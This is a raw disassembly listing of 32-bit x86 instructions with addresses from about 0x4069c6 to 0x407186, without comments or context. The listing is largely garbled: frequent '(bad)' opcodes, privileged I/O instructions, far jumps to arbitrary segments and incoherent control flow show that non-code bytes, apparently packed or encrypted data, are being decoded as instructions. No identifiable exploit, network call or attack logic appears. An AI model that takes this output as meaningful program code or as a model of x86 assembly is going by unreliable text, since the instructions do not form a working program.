  4069c6:	or     eax,0xa1a16db1
  4069cb:	jmp    0x406a27
  4069cd:	stos   BYTE PTR es:[edi],al
  4069ce:	(bad)  
  4069cf:	cmp    ah,bh
  4069d1:	jo     0x406990
  4069d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069d4:	loopne 0x406980
  4069d6:	or     edx,ecx
  4069d8:	mov    WORD PTR [esi-0x12],?
  4069db:	mov    edx,0x8d8cda48
  4069e0:	jp     0x4069f3
  4069e2:	dec    esp
  4069e3:	rcl    DWORD PTR [edx],0xeb
  4069e6:	addr16 int3 
  4069e8:	mov    bl,0xc0
  4069ea:	into   
  4069eb:	xor    bl,BYTE PTR [esi+eax*8]
  4069ee:	xor    BYTE PTR [ebx-0x73d84ca],ah
  4069f4:	stos   DWORD PTR es:[edi],eax
  4069f5:	iret   
  4069f6:	cmc    
  4069f7:	cwde   
  4069f8:	mov    ds:0x7a06d83c,eax
  4069fd:	add    eax,0x4d0748d3
  406a02:	xor    esi,DWORD PTR [ecx+0x10]
  406a05:	mov    DWORD PTR [esi-0x13dc0c2d],edx
  406a0b:	mov    esp,0xcaf7783f
  406a10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a11:	sbb    eax,0x18d6c855
  406a16:	loope  0x406a0e
  406a18:	ja     0x406a30
  406a1a:	xor    eax,DWORD PTR [esi+0x260e300a]
  406a20:	cmp    bl,BYTE PTR [edi-0x43452f9f]
  406a26:	ds iret 
  406a28:	rcl    DWORD PTR [ebx],1
  406a2a:	jns    0x406a9d
  406a2c:	push   ss
  406a2d:	jo     0x406a59
  406a2f:	xor    DWORD PTR [edx-0x5e],esi
  406a32:	unpckhps xmm3,XMMWORD PTR [esi+0x6976bd09]
  406a39:	enter  0x10a2,0x37
  406a3d:	xchg   esi,eax
  406a3e:	in     eax,dx
  406a3f:	js     0x406a1e
  406a41:	jp     0x4069d2
  406a43:	dec    edi
  406a44:	or     eax,0xe4ab573a
  406a49:	je     0x406a2d
  406a4b:	xchg   ebp,eax
  406a4c:	add    bh,al
  406a4e:	add    al,cl
  406a50:	jecxz  0x406aa5
  406a52:	jae    0x406a57
  406a54:	dec    esp
  406a55:	inc    edx
  406a56:	mov    bl,BYTE PTR [edi+0x58]
  406a59:	push   cs
  406a5a:	add    bl,BYTE PTR [ecx+0x48866a4b]
  406a60:	and    edi,DWORD PTR [ecx+ecx*4]
  406a63:	int    0xa4
  406a65:	sub    al,0x45
  406a67:	idiv   ah
  406a69:	and    dl,BYTE PTR [eax-0x33]
  406a6c:	xchg   BYTE PTR [ebx-0x58135a6a],dh
  406a72:	test   BYTE PTR [edi-0x6b],bh
  406a75:	cmp    DWORD PTR [ecx],esi
  406a77:	mov    ah,0xf
  406a79:	pop    edx
  406a7a:	(bad)  
  406a7c:	fld    st(6)
  406a7e:	mov    esi,0x162ae1a
  406a83:	fadd   st(3),st
  406a85:	jl     0x406a5d
  406a87:	push   edx
  406a88:	test   ah,ch
  406a8a:	xchg   edi,eax
  406a8b:	je     0x406a3a
  406a8d:	outs   dx,BYTE PTR ds:[esi]
  406a8e:	mov    ds:0x3d8488d9,al
  406a93:	jp     0x406a40
  406a95:	cmp    esi,edi
  406a97:	mov    eax,0xb5e0b50f
  406a9c:	out    0x6b,al
  406a9e:	mov    ebp,0xe4d2c3aa
  406aa3:	dec    ecx
  406aa4:	je     0x406b02
  406aa6:	inc    edi
  406aa7:	add    eax,DWORD PTR [ecx-0x32d746f2]
  406aad:	ins    DWORD PTR es:[edi],dx
  406aae:	(bad)  
  406aaf:	jg     0x406aa4
  406ab1:	cli    
  406ab2:	pop    esi
  406ab3:	fidiv  WORD PTR [edx-0x46c8a0fa]
  406ab9:	sub    ah,BYTE PTR [ebx*4+0x50d7bd03]
  406ac0:	aad    0xb7
  406ac2:	add    eax,0x76117de9
  406ac7:	test   BYTE PTR [esi],cl
  406ac9:	mov    esp,0x946f707f
  406ace:	mov    eax,0xcb7bf507
  406ad3:	pop    ecx
  406ad4:	scas   al,BYTE PTR es:[edi]
  406ad5:	je     0x406af3
  406ad7:	jmp    0x1ae00080
  406adc:	(bad)  
  406add:	jecxz  0x406a90
  406adf:	(bad)  
  406ae0:	mov    bl,0x7
  406ae2:	cmp    ah,BYTE PTR [ebp+0x22]
  406ae5:	cdq    
  406ae6:	mov    ch,0x3e
  406ae8:	mov    ebx,0x5a9c1f84
  406aed:	mov    dh,0x14
  406aef:	add    DWORD PTR [edx],esi
  406af1:	or     edx,esi
  406af3:	inc    ecx
  406af4:	dec    edi
  406af5:	cmp    DWORD PTR [ebp-0x80],ebp
  406af8:	int    0xe1
  406afa:	mov    WORD PTR [ebp+0xc],ss
  406afd:	push   eax
  406afe:	repnz in al,dx
  406b00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b01:	sti    
  406b02:	rcl    ebp,cl
  406b04:	(bad)  
  406b05:	mov    ecx,0x7e19180f
  406b0a:	popf   
  406b0b:	pop    ss
  406b0c:	jae    0x406b6f
  406b0e:	push   0x66
  406b10:	fstp   DWORD PTR [ebp-0x4e]
  406b13:	lds    ecx,FWORD PTR [edx-0x53]
  406b16:	test   BYTE PTR ds:[esi+ebp*1],ch
  406b1a:	ret    0x3c27
  406b1d:	fisub  DWORD PTR [ebx-0x51]
  406b20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406b21:	mov    ch,0xfd
  406b23:	fmul   QWORD PTR [eax+0x1d]
  406b26:	push   edi
  406b27:	jns    0x406acb
  406b29:	in     eax,0xe8
  406b2b:	push   eax
  406b2c:	lock or DWORD PTR [eax-0x4e1bafb3],0x431326f6
  406b37:	dec    eax
  406b38:	cmp    ebx,edx
  406b3a:	mov    edx,0x6c25c491
  406b3f:	and    DWORD PTR [esi+eax*8],edi
  406b42:	daa    
  406b43:	retf   0xba43
  406b46:	inc    ebx
  406b47:	or     DWORD PTR ds:0x1901,esi
  406b4c:	inc    ecx
  406b4d:	ss dec esp
  406b4f:	shl    DWORD PTR [esi-0x28283d89],0x5b
  406b56:	repz arpl WORD PTR [ebx-0x608403a1],cx
  406b5d:	fcom   DWORD PTR [ebx-0x4325497e]
  406b63:	fisubr DWORD PTR [edx+esi*8+0x4edf8e1b]
  406b6a:	xlat   BYTE PTR ds:[ebx]
  406b6b:	dec    edx
  406b6c:	jne    0x406b51
  406b6e:	xchg   DWORD PTR [ebp-0x46a94dad],ebx
  406b74:	mov    ch,BYTE PTR [eax*4-0x11269c51]
  406b7b:	mov    dl,0x69
  406b7d:	rol    DWORD PTR [esi+0x36fa5ef5],1
  406b83:	loopne 0x406bd3
  406b85:	mov    ds,WORD PTR [edx+0x34]
  406b88:	push   esp
  406b89:	lea    edx,[ecx-0x46]
  406b8c:	aaa    
  406b8d:	dec    ebp
  406b8e:	ficomp WORD PTR [ebx-0x1387bbb4]
  406b94:	inc    eax
  406b95:	add    al,0x21
  406b97:	shr    BYTE PTR [esi],1
  406b99:	loope  0x406b93
  406b9b:	xchg   esi,eax
  406b9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b9d:	cmp    eax,0x1465bf3a
  406ba2:	cmp    ah,bl
  406ba4:	xchg   esp,eax
  406ba5:	(bad)  
  406ba6:	hlt    
  406ba7:	mov    dh,0xcd
  406ba9:	and    bh,BYTE PTR [edi+0x37]
  406bac:	mov    bh,0x14
  406bae:	mov    ebp,0x75131494
  406bb3:	ins    BYTE PTR es:[edi],dx
  406bb4:	mov    dl,0xcb
  406bb6:	ins    DWORD PTR es:[edi],dx
  406bb7:	(bad)  
  406bb8:	ds hlt 
  406bba:	push   0xffffffe6
  406bbc:	scas   al,BYTE PTR es:[edi]
  406bbd:	dec    ecx
  406bbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bbf:	aas    
  406bc0:	lock (bad) 
  406bc2:	scas   al,BYTE PTR es:[edi]
  406bc3:	nop
  406bc4:	xchg   ecx,eax
  406bc5:	dec    ecx
  406bc6:	retf   0xa729
  406bc9:	cmp    al,0x17
  406bcb:	jge    0x406bab
  406bcd:	lahf   
  406bce:	enter  0xcedb,0xa0
  406bd2:	cmp    al,0x98
  406bd4:	addr16 xchg esi,eax
  406bd6:	jae    0x406c13
  406bd8:	xor    eax,0x70d79b3a
  406bdd:	test   BYTE PTR [edi*2-0x71839476],0x1b
  406be5:	aam    0xd1
  406be7:	fwait
  406be8:	or     al,0x85
  406bea:	fnsave [esi]
  406bec:	xor    eax,0xfc0cf250
  406bf1:	sbb    BYTE PTR [ebx+0x1ac488dd],0x6c
  406bf8:	cmp    al,BYTE PTR [esi-0x5131b784]
  406bfe:	mov    esp,0xb5844da9
  406c03:	imul   edi,DWORD PTR [edi],0xdfbf10de
  406c09:	jp     0x406bf2
  406c0b:	test   al,0xd6
  406c0d:	pop    ebx
  406c0e:	mov    esi,0x94d4916f
  406c13:	repz jmp 0xe48c:0x88d7374b
  406c1b:	cli    
  406c1c:	mov    esi,0x2aee5145
  406c21:	test   BYTE PTR [esi+0x64],bh
  406c24:	retf   
  406c25:	call   0x42bb:0x6a828ef3
  406c2c:	ret    0xcd82
  406c2f:	xchg   ecx,eax
  406c30:	add    DWORD PTR [edi],eax
  406c32:	rol    BYTE PTR [eax-0x6ecfeaa],1
  406c38:	jo     0x406bdb
  406c3a:	jnp    0x406be5
  406c3c:	push   ss
  406c3d:	ror    DWORD PTR [edx-0x468e45b9],0x97
  406c44:	mov    dl,0x85
  406c46:	push   eax
  406c47:	and    BYTE PTR [edx-0x26bf2ebd],bl
  406c4d:	xlat   BYTE PTR ds:[ebx]
  406c4e:	leave  
  406c4f:	fstp   QWORD PTR [edx]
  406c51:	iret   
  406c52:	cmp    BYTE PTR [ebx+0x6e],cl
  406c55:	or     al,0xb1
  406c57:	or     dh,BYTE PTR [edi]
  406c59:	test   al,0x20
  406c5b:	aad    0xbc
  406c5d:	daa    
  406c5e:	out    0x1d,eax
  406c60:	fnstcw WORD PTR [esi]
  406c62:	xchg   ebp,eax
  406c63:	adc    bl,dl
  406c65:	adc    dh,BYTE PTR [eax]
  406c67:	sbb    ebx,0xf58b0190
  406c6d:	mov    eax,ds:0x488d821d
  406c72:	in     al,0x41
  406c74:	scas   al,BYTE PTR es:[edi]
  406c75:	jne    0x406c70
  406c77:	adc    BYTE PTR [ecx],bl
  406c79:	test   BYTE PTR [ebp+esi*8+0x5374c16a],0x8a
  406c81:	pop    ebp
  406c82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c83:	mov    BYTE PTR [ebp+0x32235276],ah
  406c89:	xchg   DWORD PTR [eax+eiz*8-0x6f],esp
  406c8d:	sub    ah,BYTE PTR [ecx+0x580ffc80]
  406c93:	imul   esp,DWORD PTR [eax-0xd],0x2a
  406c97:	jnp    0x406ce0
  406c99:	shl    DWORD PTR [ebp+eax*4+0x7e],0xc7
  406c9e:	push   cs
  406c9f:	adc    bh,BYTE PTR [ebx+0xa5af395]
  406ca5:	fisttp QWORD PTR ss:[ecx+0xbe38eba]
  406cac:	fcomp  QWORD PTR [esi+edx*1-0x68]
  406cb0:	or     eax,ebx
  406cb2:	or     al,0xbc
  406cb4:	cmp    esi,ebp
  406cb6:	(bad)  
  406cb8:	xchg   ebp,eax
  406cb9:	loop   0x406c4b
  406cbb:	mov    ds:0xb8e0666e,al
  406cc0:	ror    BYTE PTR [edx+0x5e],cl
  406cc3:	jnp    0x406d0f
  406cc5:	xor    al,0x8a
  406cc7:	add    DWORD PTR [ecx+0x72],eax
  406cca:	pop    edx
  406ccb:	mov    ah,0x71
  406ccd:	aam    0xc1
  406ccf:	ins    DWORD PTR es:[edi],dx
  406cd0:	cli    
  406cd1:	cmp    ebp,DWORD PTR [eax+ebp*8-0x50d8d498]
  406cd8:	and    eax,ebx
  406cda:	xor    ebx,esp
  406cdc:	xor    al,BYTE PTR [edi]
  406cde:	(bad)  
  406cdf:	fcom   DWORD PTR [edx+0x425d0dd3]
  406ce5:	jecxz  0x406d2e
  406ce7:	mov    ebx,0x660fd45d
  406cec:	repnz mov bl,BYTE PTR [ecx]
  406cef:	push   ebx
  406cf0:	outs   dx,BYTE PTR ds:[esi]
  406cf1:	push   edi
  406cf2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cf3:	adc    eax,edi
  406cf5:	(bad)  [esi+0x1b747691]
  406cfb:	leave  
  406cfc:	fisttp DWORD PTR [ecx-0x1d]
  406cff:	and    al,0x20
  406d01:	cmp    BYTE PTR [eax-0x5a1ee64],bl
  406d07:	push   es
  406d08:	add    DWORD PTR [eax],0xffffff8a
  406d0b:	pop    edx
  406d0c:	dec    edx
  406d0d:	push   es
  406d0e:	cmp    cl,ah
  406d10:	loope  0x406d2a
  406d12:	dec    ecx
  406d13:	sbb    eax,0xab87766a
  406d18:	popa   
  406d19:	mov    eax,ds:0x976c9d1
  406d1e:	div    BYTE PTR [edx+0x62a4011e]
  406d24:	inc    edx
  406d25:	mov    ds:0xd2dd5a84,eax
  406d2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d2b:	pop    eax
  406d2c:	push   eax
  406d2d:	mov    ah,0x6
  406d2f:	mov    ah,0xc3
  406d31:	inc    esp
  406d32:	push   es
  406d33:	int3   
  406d34:	cmp    edi,DWORD PTR [edi+0x5344cd94]
  406d3a:	dec    ecx
  406d3b:	jecxz  0x406d32
  406d3d:	mov    BYTE PTR [ebx-0x8],0xd5
  406d41:	inc    edx
  406d42:	xchg   edx,eax
  406d43:	add    esi,edx
  406d45:	add    eax,0xeeab9e7f
  406d4a:	xchg   esp,eax
  406d4b:	idiv   bl
  406d4d:	cmp    dh,0x43
  406d50:	pop    esp
  406d51:	dec    edi
  406d52:	add    dh,BYTE PTR [ebx+0x41eaf338]
  406d58:	mov    bh,0xeb
  406d5a:	dec    edx
  406d5b:	pop    ds
  406d5c:	sbb    DWORD PTR [edi+0x442e4ad2],esi
  406d62:	cmc    
  406d63:	mov    bh,0x3e
  406d65:	aas    
  406d66:	add    eax,0x2e2a7582
  406d6b:	js     0x406d89
  406d6d:	or     cl,BYTE PTR [edx-0x599d9854]
  406d73:	(bad)  
  406d74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d75:	out    0x90,al
  406d77:	cmc    
  406d78:	(bad)  
  406d79:	mov    ebp,0xeb8bc97
  406d7e:	jbe    0x406d26
  406d80:	stos   BYTE PTR es:[edi],al
  406d81:	inc    ecx
  406d82:	mov    bh,0xc2
  406d84:	jo     0x406db3
  406d86:	in     eax,0x30
  406d88:	ds and ebp,ebp
  406d8b:	push   edi
  406d8c:	mov    bl,0xe7
  406d8e:	enter  0x4764,0x1d
  406d92:	repnz mov esi,0xfa989662
  406d98:	inc    esi
  406d99:	jl     0x406d4d
  406d9b:	pop    esp
  406d9c:	xor    al,0xf2
  406d9e:	pop    ebp
  406d9f:	sub    ch,dl
  406da1:	imul   esi,DWORD PTR [ecx+0x17],0xffffffc3
  406da5:	inc    edx
  406da6:	dec    esp
  406da7:	inc    edx
  406da8:	sbb    eax,0xac6cb744
  406dad:	rol    DWORD PTR [ecx],cl
  406daf:	sub    ebx,ebx
  406db1:	sti    
  406db2:	xchg   ecx,eax
  406db3:	aaa    
  406db4:	xchg   ecx,ecx
  406db6:	mov    bl,0x3c
  406db8:	jbe    0x406e0e
  406dba:	ret    
  406dbb:	out    0xc8,al
  406dbd:	mov    ebx,0x8265d61f
  406dc2:	xor    DWORD PTR [bx+0x75ef],ecx
  406dc7:	jg     0x406da1
  406dc9:	xchg   esp,eax
  406dca:	popa   
  406dcb:	xlat   BYTE PTR ds:[ebx]
  406dcc:	and    bh,BYTE PTR [eax-0x44]
  406dcf:	pop    ecx
  406dd0:	xor    ah,0x17
  406dd3:	inc    edx
  406dd4:	fidivr DWORD PTR [ebx-0x57ec4387]
  406dda:	sbb    al,0x14
  406ddc:	sbb    BYTE PTR [esi+0x7e6115fd],0xc6
  406de3:	jae    0x406e2e
  406de5:	pop    ss
  406de6:	pop    ds
  406de7:	inc    ebx
  406de8:	push   esp
  406de9:	inc    edi
  406dea:	in     eax,0xf6
  406dec:	xchg   bl,bl
  406dee:	out    dx,eax
  406def:	jmp    0xd7f1fc48
  406df4:	in     al,0x2c
  406df6:	repnz (bad) 
  406df8:	and    al,0xc9
  406dfa:	or     eax,0x856166f0
  406dff:	cli    
  406e00:	dec    eax
  406e01:	popa   
  406e02:	pop    esp
  406e03:	in     eax,0x9e
  406e05:	dec    esp
  406e06:	fcom   DWORD PTR [edx-0x67d14f2f]
  406e0c:	and    al,0xfe
  406e0e:	sahf   
  406e0f:	sbb    eax,0x78c10da7
  406e14:	or     DWORD PTR [ebx-0x18],esp
  406e17:	cmp    BYTE PTR [esi-0x18],bh
  406e1a:	xor    DWORD PTR [eax+0x70],ecx
  406e1d:	not    DWORD PTR ds:0x1be46a4c
  406e23:	out    dx,al
  406e24:	je     0x406dbb
  406e26:	or     ebx,DWORD PTR [ebx]
  406e28:	sbb    dl,al
  406e2a:	jbe    0x406e0b
  406e2c:	jae    0x406daf
  406e2e:	shl    BYTE PTR [ebp-0x6e],cl
  406e31:	aad    0xc0
  406e33:	xchg   BYTE PTR ss:[eax-0x59],ah
  406e37:	mov    al,gs:0x165644af
  406e3d:	into   
  406e3e:	out    0xa2,eax
  406e40:	xor    eax,0xae47c638
  406e45:	in     al,dx
  406e46:	(bad)  
  406e47:	dec    ebx
  406e48:	or     esi,edi
  406e4a:	imul   BYTE PTR [edi+0xb068141]
  406e50:	and    ch,BYTE PTR [edi-0x6d37297a]
  406e56:	lods   al,BYTE PTR ds:[esi]
  406e57:	pop    ds
  406e58:	nop
  406e59:	adc    bh,ch
  406e5b:	add    DWORD PTR [esi+0x79],eax
  406e5e:	dec    esp
  406e5f:	fwait
  406e60:	dec    esi
  406e61:	add    ah,BYTE PTR [eax+ebp*1+0x46]
  406e65:	cmp    BYTE PTR [esi],bh
  406e67:	retf   
  406e68:	push   esp
  406e69:	(bad)  
  406e6a:	sub    bl,dl
  406e6c:	and    al,0x63
  406e6e:	cs dec esi
  406e70:	mov    eax,0xd882914
  406e75:	cmp    ebp,DWORD PTR [edi+0x240b9e70]
  406e7b:	jne    0x406ebf
  406e7d:	jge    0x406e41
  406e7f:	push   esp
  406e80:	mov    ebp,0xbb373ef
  406e85:	dec    ebp
  406e86:	mov    ebp,0x662ea38d
  406e8b:	jb     0x406e51
  406e8d:	or     dl,al
  406e8f:	imul   esi,DWORD PTR ds:0xa8a589bd,0x3b
  406e96:	popa   
  406e97:	pop    ss
  406e98:	ret    0x750e
  406e9b:	mov    DWORD PTR [edx+0xb5d308],edi
  406ea1:	inc    eax
  406ea2:	jmp    0x19a3:0x12ba0463
  406ea9:	sub    DWORD PTR [edx-0x743f0e99],edi
  406eaf:	push   eax
  406eb0:	mov    ds:0x9548a8b6,eax
  406eb5:	sub    al,0xab
  406eb7:	arpl   WORD PTR [edi],bx
  406eb9:	pop    es
  406eba:	lahf   
  406ebb:	and    ebx,DWORD PTR [edx+0x6db2202e]
  406ec1:	dec    esi
  406ec2:	ins    DWORD PTR es:[edi],dx
  406ec3:	mov    ebx,0x2e396eff
  406ec8:	ds mov al,0x3b
  406ecb:	and    dh,dl
  406ecd:	dec    esi
  406ece:	inc    ebp
  406ecf:	cmp    edx,ebx
  406ed1:	and    bl,ch
  406ed3:	jae    0x406ef9
  406ed5:	jle    0x406ef3
  406ed7:	xor    edx,ecx
  406ed9:	retf   0xf84b
  406edc:	not    DWORD PTR [ebx-0x417fa450]
  406ee2:	(bad)  
  406ee3:	aam    0x8d
  406ee5:	inc    ebp
  406ee6:	jo     0x406f0e
  406ee8:	imul   ebp,DWORD PTR [ebp-0x61],0xc2ab330f
  406eef:	xchg   edx,eax
  406ef0:	(bad)  
  406ef1:	lea    esp,[ebx*8+0x4f01f9b5]
  406ef8:	xchg   edi,eax
  406ef9:	out    0x3a,al
  406efb:	sbb    ch,dl
  406efd:	pop    esp
  406efe:	loopne 0x406e85
  406f00:	push   ss
  406f01:	imul   BYTE PTR [ebp-0x7567abec]
  406f07:	aam    0x36
  406f09:	or     ebp,eax
  406f0b:	jne    0x406f22
  406f0d:	pop    edx
  406f0e:	hlt    
  406f0f:	fldlg2 
  406f11:	jg     0x406f35
  406f13:	sti    
  406f14:	push   cs
  406f15:	popa   
  406f16:	jmp    0x406e98
  406f18:	jmp    0x137aa160
  406f1d:	ret    0x9afb
  406f20:	pop    ds
  406f21:	push   ebp
  406f22:	ja     0x406f21
  406f24:	mov    bh,0x1a
  406f26:	push   ds
  406f27:	lahf   
  406f28:	pop    esp
  406f29:	mul    BYTE PTR ss:[ebp+0x14d1b606]
  406f30:	cld    
  406f31:	mov    edi,0x5c4d1ff3
  406f36:	test   al,0x8f
  406f39:	and    BYTE PTR [edx-0x43a549fb],dh
  406f3f:	adc    eax,edx
  406f41:	xlat   BYTE PTR ds:[ebx]
  406f42:	cli    
  406f43:	xchg   edi,eax
  406f44:	sbb    BYTE PTR [ecx+ecx*8-0x3a],al
  406f48:	pop    ss
  406f49:	fsubr  st,st(1)
  406f4b:	sbb    al,dh
  406f4d:	sub    esp,ebp
  406f4f:	(bad)  
  406f50:	(bad)  
  406f51:	inc    eax
  406f52:	adc    BYTE PTR [ebx+ecx*4+0x70],dl
  406f56:	cmp    al,0x84
  406f58:	ja     0x406f60
  406f5a:	pop    edx
  406f5b:	cmp    DWORD PTR ds:0x26938a48,0xb343990d
  406f65:	aas    
  406f66:	jne    0x406fc6
  406f68:	clc    
  406f69:	je     0x406f1b
  406f6b:	inc    edx
  406f6c:	mov    dh,0x6b
  406f6e:	or     DWORD PTR [edi+ebx*1-0x7a4a7da1],ebx
  406f75:	ret    
  406f76:	cmp    DWORD PTR [edx],esi
  406f78:	mov    cl,0x6d
  406f7a:	dec    DWORD PTR [ebx+0x523ae95d]
  406f80:	(bad)  
  406f82:	xchg   esi,eax
  406f83:	add    eax,0x810fe74d
  406f88:	xor    esi,DWORD PTR [edi]
  406f8a:	fst    QWORD PTR [ebp-0x35]
  406f8d:	out    dx,al
  406f8e:	push   ds
  406f8f:	fdiv   QWORD PTR [ecx+edi*8]
  406f92:	ins    DWORD PTR es:[edi],dx
  406f93:	cli    
  406f94:	xchg   ebx,eax
  406f95:	mov    bl,BYTE PTR [ebp+eax*4-0xd40e32f]
  406f9c:	clc    
  406f9d:	adc    al,0x38
  406f9f:	push   cs
  406fa0:	add    al,0x29
  406fa2:	and    al,0xb4
  406fa4:	loopne 0x406f4c
  406fa6:	call   FWORD PTR [ecx]
  406fa8:	jo     0x406f75
  406faa:	mov    cl,0xa0
  406fac:	out    0xc0,eax
  406fae:	and    ebp,ebp
  406fb0:	fs out 0x77,al
  406fb3:	xchg   edi,eax
  406fb4:	push   ds
  406fb5:	out    0x7d,al
  406fb7:	mov    eax,0x8afe934
  406fbc:	pop    esp
  406fbd:	mov    cl,BYTE PTR [ebx]
  406fbf:	daa    
  406fc0:	test   BYTE PTR [ebx+0x76],al
  406fc3:	inc    esi
  406fc4:	dec    edx
  406fc5:	ja     0x40701b
  406fc7:	xchg   ebx,eax
  406fc8:	fcom   QWORD PTR [ecx+0xc79557a]
  406fce:	jae    0x406f5a
  406fd0:	pop    es
  406fd1:	mov    dl,0x50
  406fd3:	arpl   WORD PTR [ecx+0x3c],ax
  406fd6:	imul   ebx,ecx,0xffffffc7
  406fd9:	stos   BYTE PTR es:[edi],al
  406fda:	sub    eax,0x5d7fb82
  406fdf:	dec    edx
  406fe0:	leave  
  406fe1:	fcmovnbe st,st(4)
  406fe3:	gs xchg ebp,eax
  406fe5:	xor    edi,edi
  406fe7:	mov    ds:0xe6f001b0,eax
  406fec:	push   edi
  406fed:	mov    dh,BYTE PTR [edx+edx*1]
  406ff0:	push   esi
  406ff1:	out    0x14,eax
  406ff3:	leave  
  406ff4:	clc    
  406ff5:	fiadd  WORD PTR [edx-0x46fa254b]
  406ffb:	std    
  406ffc:	sbb    BYTE PTR [edx+edi*4+0x3abdd5d],bh
  407003:	sahf   
  407004:	adc    esi,ebp
  407006:	lahf   
  407007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407008:	pop    esi
  407009:	(bad)  
  40700a:	call   eax
  40700c:	fs in  eax,0xdd
  40700f:	xor    al,cl
  407011:	loope  0x406feb
  407013:	je     0x407034
  407015:	ins    BYTE PTR es:[edi],dx
  407016:	jl     0x407029
  407018:	arpl   WORD PTR [ecx],ax
  40701a:	adc    dh,BYTE PTR [eax+eiz*1-0x35]
  40701e:	mov    eax,ds:0xe92859bd
  407023:	out    dx,eax
  407024:	fnstenv [esi-0x7d]
  407027:	test   DWORD PTR [ebp-0x1bfb6f5d],edx
  40702d:	fist   WORD PTR [bx+di-0x2523]
  407032:	leave  
  407033:	dec    esp
  407034:	clc    
  407035:	mov    esi,0xab2c5553
  40703a:	adc    DWORD PTR [ecx],edx
  40703c:	or     BYTE PTR [ebx],0xf5
  40703f:	mov    bl,0x33
  407041:	sub    al,0x24
  407043:	jnp    0x407058
  407045:	or     al,0x5e
  407047:	push   0x8e025b71
  40704c:	fbstp  TBYTE PTR [eax+0x4562df47]
  407052:	sbb    eax,0xc2a01dbc
  407057:	push   0x270ac3a
  40705c:	mov    bh,0x41
  40705e:	xchg   ebp,eax
  40705f:	arpl   WORD PTR [ebp-0x28],bx
  407062:	ins    DWORD PTR es:[edi],dx
  407063:	mov    ds:0xe32ce60e,eax
  407068:	push   ebp
  407069:	push   0xdede8491
  40706e:	and    eax,0xb1b70796
  407073:	adc    DWORD PTR [edx+0x43],ebp
  407076:	cmp    ecx,DWORD PTR [edx-0x5e]
  407079:	xor    DWORD PTR [ebp+0x7e],ecx
  40707c:	hlt    
  40707d:	fcom   DWORD PTR fs:[esi+0x7]
  407081:	popf   
  407082:	icebp  
  407083:	lock jecxz 0x4070a5
  407086:	adc    BYTE PTR [esi+0x46e7a9cd],al
  40708c:	add    DWORD PTR [eax-0x384adab9],eax
  407092:	pop    ecx
  407093:	pop    eax
  407094:	mul    DWORD PTR [ecx+ebx*2+0x428083be]
  40709b:	inc    eax
  40709c:	inc    edi
  40709d:	call   0x16b6:0x3cdbd436
  4070a4:	aad    0x14
  4070a6:	rcl    BYTE PTR [esi],1
  4070a8:	fadd   st,st(3)
  4070aa:	mov    cs,WORD PTR [edi-0x21]
  4070ad:	adc    BYTE PTR [ebx+0x666f065a],ah
  4070b3:	test   eax,0xab35be74
  4070b8:	mov    esp,0x7fff49fc
  4070bd:	shl    dl,1
  4070bf:	dec    esp
  4070c0:	(bad)  
  4070c1:	cmp    eax,0x680c023d
  4070c6:	and    ch,dh
  4070c8:	stos   BYTE PTR es:[edi],al
  4070c9:	shr    BYTE PTR [ecx+0x4d],cl
  4070cc:	xchg   edx,eax
  4070cd:	scas   eax,DWORD PTR es:[edi]
  4070ce:	add    BYTE PTR [eax+0x3fed32e9],cl
  4070d4:	fsubr  st,st(5)
  4070d6:	add    al,0xe8
  4070d8:	enter  0x255c,0xa5
  4070dc:	fcomp  DWORD PTR [ebx-0x579ed659]
  4070e2:	ds dec ebp
  4070e4:	aad    0x72
  4070e6:	push   ss
  4070e7:	jmp    0x78dfd9aa
  4070ec:	pop    edi
  4070ed:	push   esi
  4070ee:	and    BYTE PTR [edi],ch
  4070f0:	cmp    dl,BYTE PTR [ebp+0x51c004ab]
  4070f6:	sar    BYTE PTR [ebp+0x43b5352b],cl
  4070fc:	xlat   BYTE PTR ds:[ebx]
  4070fd:	xor    DWORD PTR [ebx+0x3f9bc5d0],0x969d6461
  407107:	mov    eax,DWORD PTR [ebx]
  407109:	outs   dx,DWORD PTR ds:[esi]
  40710a:	data16 mov WORD PTR [edx+0x44],ds
  40710e:	mov    ch,0xf5
  407110:	imul   esp,DWORD PTR [ebx],0x47
  407113:	pop    ecx
  407114:	or     eax,0xbeb87804
  407119:	adc    BYTE PTR [ebx],dl
  40711b:	imul   ebp,edi,0x68c56db7
  407121:	pop    edi
  407122:	mov    edi,DWORD PTR [esi]
  407124:	mov    al,0x80
  407126:	sub    al,dh
  407128:	lods   eax,DWORD PTR ds:[esi]
  407129:	pop    ss
  40712a:	clc    
  40712b:	inc    ebp
  40712c:	scas   eax,DWORD PTR es:[edi]
  40712d:	and    al,0x6c
  40712f:	push   ecx
  407130:	mov    eax,ds:0x3e88e4f3
  407135:	in     eax,dx
  407136:	sbb    eax,0x5d1711b8
  40713b:	ja     0x4070c2
  40713d:	mov    cl,0x9f
  40713f:	inc    edx
  407140:	jp     0x407105
  407142:	pop    ss
  407143:	dec    edi
  407144:	(bad)  
  407146:	rol    DWORD PTR [edi-0xe65feba],cl
  40714c:	pop    eax
  40714d:	and    DWORD PTR [edx],esi
  40714f:	push   edx
  407150:	sbb    DWORD PTR [ecx+ebx*2+0x5f],ecx
  407154:	call   0x8ecd:0x5ed0c4c2
  40715b:	jle    0x407166
  40715d:	inc    eax
  40715e:	test   eax,0x63146bd9
  407163:	inc    esi
  407164:	push   ecx
  407165:	(bad)  
  407166:	out    dx,eax
  407167:	(bad)  
  407168:	stc    
  407169:	sbb    DWORD PTR [ecx-0x20],ebx
  40716c:	and    DWORD PTR [esp+ecx*1],ebx
  40716f:	das    
  407170:	out    0xa8,al
  407172:	ins    BYTE PTR es:[edi],dx
  407173:	ja     0x407130
  407175:	out    0xa3,eax
  407177:	and    al,0xa6
  407179:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40717a:	sub    eax,0x495c89df
  40717f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407180:	xor    esi,0xe41016b1
  407186:	adc    DWORD PTR [ebp+0x29c3057d],edx
